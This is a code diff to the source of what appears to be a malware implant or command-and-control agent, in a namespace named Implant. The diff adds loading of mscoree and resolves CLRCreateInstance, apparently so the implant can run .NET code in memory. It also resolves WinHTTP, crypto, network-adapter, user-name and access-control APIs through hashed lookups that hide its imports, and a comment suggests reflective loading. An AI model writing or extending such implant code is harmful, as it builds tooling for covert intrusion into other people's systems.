@@ -67,14 +67,15 @@ namespace Implant {
         Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);
 
         //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
-
         // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
+
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
                 !(Ctx->Modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                 !(Ctx->Modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                 !(Ctx->Modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.iphl     = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
+                !(Ctx->Modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
                 return_defer(ERROR_MOD_NOT_FOUND);
             }
         }
@@ -96,7 +97,7 @@ namespace Implant {
             !(FPTR(Ctx->win32.WinHttpQueryHeaders,          Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
             !(FPTR(Ctx->win32.WinHttpQueryDataAvailable,    Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
             !(FPTR(Ctx->win32.WinHttpCloseHandle,           Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
-            !(FPTR(Ctx->win32.GetAdaptersInfo,              Ctx->Modules.iphl   , GETADAPTERSINFO)) ||
+            !(FPTR(Ctx->win32.GetAdaptersInfo,              Ctx->Modules.iphlpapi, GETADAPTERSINFO)) ||
             !(FPTR(Ctx->win32.CryptStringToBinaryA,         Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
             !(FPTR(Ctx->win32.CryptBinaryToStringA,         Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
             !(FPTR(Ctx->win32.GetUserNameA,                 Ctx->Modules.advapi, GETUSERNAMEA)) ||
@@ -109,6 +110,7 @@ namespace Implant {
             !(FPTR(Ctx->win32.InitializeAcl,                Ctx->Modules.advapi, INITIALIZEACL)) ||
             !(FPTR(Ctx->win32.SetSecurityDescriptorDacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
             !(FPTR(Ctx->win32.SetSecurityDescriptorSacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
+            !(FPTR(Ctx->win32.CLRCreateInstance,            Ctx->Modules.mscoree, CLRCREATEINSTANCE)) ||
             !(FPTR(Ctx->win32.FreeSid,                      Ctx->Modules.advapi, FREESID))) {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
